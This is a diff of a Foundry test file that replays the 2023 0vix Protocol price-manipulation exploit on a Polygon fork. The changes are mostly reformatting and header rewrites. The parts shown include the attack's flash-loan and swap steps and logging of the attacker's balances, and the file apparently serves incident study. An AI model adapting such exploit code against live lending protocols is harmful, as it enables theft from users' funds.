@@ -2,18 +2,20 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+import {ICErc20Delegate, IERC20, IUnitroller, IAaveFlashloan, IBalancerVault, Uni_Pair_V2, Uni_Pair_V3} from "./../interface.sol";
 
-// @Analysis
-// https://twitter.com/BlockSecTeam/status/1651932529874853888
-// https://twitter.com/peckshield/status/1651923235603361793
-// https://twitter.com/Mudit__Gupta/status/1651958883634536448
-// @TX
-// https://polygonscan.com/tx/0x10f2c28f5d6cd8d7b56210b4d5e0cece27e45a30808cd3d3443c05d4275bb008
-// @Summary
-// VGHSTOracle was donate to manipulate
-// STOP LISTING TOKENS WHOSE PRICE CAN BE MANIPULATED ATOMICALLY
-// Cream, Hundred, bZx, Loadstar, bonq.... same exploit
+// @KeyInfo
+// Project: https://twitter.com/0vixProtocol
+// Date: 2023-04-28
+// Vulnerability : Price Manipulation
+// Description: The root cause is due to the flawed price calculation of a deflation token.
+// Total Lost : ~@2M US$
+// Attack Tx :https://polygonscan.com/tx/0x10f2c28f5d6cd8d7b56210b4d5e0cece27e45a30808cd3d3443c05d4275bb008
+
+// @Sources
+// Twitter : https://twitter.com/BlockSecTeam/status/1651932529874853888
+// Twitter : https://twitter.com/peckshield/status/1651923235603361793
+// Twitter : https://twitter.com/Mudit__Gupta/status/1651958883634536448
 
 interface IVGHST is IERC20 {
     function enter(uint256 _amount) external returns (uint256);
@@ -90,48 +92,48 @@ contract ContractTest is Test {
 
     Exploiter exploiter;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    // CheatCodes vm = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("polygon", 42_054_768);
-        cheats.label(address(GHST), "GHST");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(WMATIC), "WMATIC");
-        cheats.label(address(DAI), "DAI");
-        cheats.label(address(WBTC), "WBTC");
-        cheats.label(address(WETH), "WETH");
-        cheats.label(address(miMATIC), "miMATIC");
-        cheats.label(address(WMATIC), "WMATIC");
-        cheats.label(address(stMATIC), "stMATIC");
-        cheats.label(address(gDAI), "gDAI");
-        cheats.label(address(wstETH), "wstETH");
-        cheats.label(address(MATICX), "MATICX");
-        cheats.label(address(vGHST), "vGHST");
-        cheats.label(address(oMATIC), "oMATIC");
-        cheats.label(address(oWBTC), "oWBTC");
-        cheats.label(address(oDAI), "oDAI");
-        cheats.label(address(oWETH), "oWETH");
-        cheats.label(address(oUSDC), "oUSDC");
-        cheats.label(address(oMATICX), "oMATICX");
-        cheats.label(address(owstWETH), "owstWETH");
-        cheats.label(address(ovGHST), "ovGHST");
-        cheats.label(address(aaveV3), "aaveV3");
-        cheats.label(address(aaveV2), "aaveV2");
-        cheats.label(address(Balancer), "Balancer");
-        cheats.label(address(AlgebraPool1), "AlgebraPool1");
-        cheats.label(address(AlgebraPool2), "AlgebraPool2");
-        cheats.label(address(AlgebraPool3), "AlgebraPool3");
-        cheats.label(address(SLP), "SLP");
-        cheats.label(address(UniV2Pair), "UniV2Pair");
-        cheats.label(address(AavegotchiPoolPair), "AavegotchiPoolPair");
-        cheats.label(address(UniV3Pair1), "UniV3Pair1");
-        cheats.label(address(UniV3Pair2), "UniV3Pair2");
-        cheats.label(address(UniV3Pair3), "UniV3Pair3");
-        cheats.label(address(UniV3Pair4), "UniV3Pair4");
-        cheats.label(address(DMMLP), "DMMLP");
-        cheats.label(address(swapFlashLoan), "swapFlashLoan");
-        cheats.label(address(unitroller), "unitroller");
+        vm.createSelectFork("polygon", 42_054_768);
+        vm.label(address(GHST), "GHST");
+        vm.label(address(USDC), "USDC");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(WMATIC), "WMATIC");
+        vm.label(address(DAI), "DAI");
+        vm.label(address(WBTC), "WBTC");
+        vm.label(address(WETH), "WETH");
+        vm.label(address(miMATIC), "miMATIC");
+        vm.label(address(WMATIC), "WMATIC");
+        vm.label(address(stMATIC), "stMATIC");
+        vm.label(address(gDAI), "gDAI");
+        vm.label(address(wstETH), "wstETH");
+        vm.label(address(MATICX), "MATICX");
+        vm.label(address(vGHST), "vGHST");
+        vm.label(address(oMATIC), "oMATIC");
+        vm.label(address(oWBTC), "oWBTC");
+        vm.label(address(oDAI), "oDAI");
+        vm.label(address(oWETH), "oWETH");
+        vm.label(address(oUSDC), "oUSDC");
+        vm.label(address(oMATICX), "oMATICX");
+        vm.label(address(owstWETH), "owstWETH");
+        vm.label(address(ovGHST), "ovGHST");
+        vm.label(address(aaveV3), "aaveV3");
+        vm.label(address(aaveV2), "aaveV2");
+        vm.label(address(Balancer), "Balancer");
+        vm.label(address(AlgebraPool1), "AlgebraPool1");
+        vm.label(address(AlgebraPool2), "AlgebraPool2");
+        vm.label(address(AlgebraPool3), "AlgebraPool3");
+        vm.label(address(SLP), "SLP");
+        vm.label(address(UniV2Pair), "UniV2Pair");
+        vm.label(address(AavegotchiPoolPair), "AavegotchiPoolPair");
+        vm.label(address(UniV3Pair1), "UniV3Pair1");
+        vm.label(address(UniV3Pair2), "UniV3Pair2");
+        vm.label(address(UniV3Pair3), "UniV3Pair3");
+        vm.label(address(UniV3Pair4), "UniV3Pair4");
+        vm.label(address(DMMLP), "DMMLP");
+        vm.label(address(swapFlashLoan), "swapFlashLoan");
+        vm.label(address(unitroller), "unitroller");
     }
 
     function testExploit() external {
@@ -143,13 +145,19 @@ contract ContractTest is Test {
         aaveV3Flashloan();
 
         emit log_named_decimal_uint(
-            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
+            "Attacker USDC balance after exploit",
+            USDC.balanceOf(address(this)),
+            USDC.decimals()
         );
         emit log_named_decimal_uint(
-            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
+            "Attacker USDT balance after exploit",
+            USDT.balanceOf(address(this)),
+            USDT.decimals()
         );
         emit log_named_decimal_uint(
-            "Attacker GHST balance after exploit", GHST.balanceOf(address(this)), GHST.decimals()
+            "Attacker GHST balance after exploit",
+            GHST.balanceOf(address(this)),
+            GHST.decimals()
         );
     }
     // aaveV3, aaveV2 FlashLoan callback
@@ -301,7 +309,11 @@ contract ContractTest is Test {
 
     function WMATICToUSDC() internal {
         UniV3Pair1.swap(
-            address(this), true, int256(WMATIC.balanceOf(address(this))), 70_888_624_962_869_287_903_104, new bytes(0)
+            address(this),
+            true,
+            int256(WMATIC.balanceOf(address(this))),
+            70_888_624_962_869_287_903_104,
+            new bytes(0)
         );
     }
 
@@ -354,7 +366,13 @@ contract ContractTest is Test {
             toInternalBalance: false
         });
         Balancer.swap(singleSwap, funds, 0, block.timestamp);
-        AlgebraPool3.swap(address(this), true, 900_000 * 1e6, 565_521_259_495_684_628_339_632_353_478_984, new bytes(0));
+        AlgebraPool3.swap(
+            address(this),
+            true,
+            900_000 * 1e6,
+            565_521_259_495_684_628_339_632_353_478_984,
+            new bytes(0)
+        );
         USDC.transfer(address(AavegotchiPoolPair), 310_000 * 1e6);
         AavegotchiPoolPair.swap(0, 158_000 * 1e18, address(this), new bytes(0));
     }
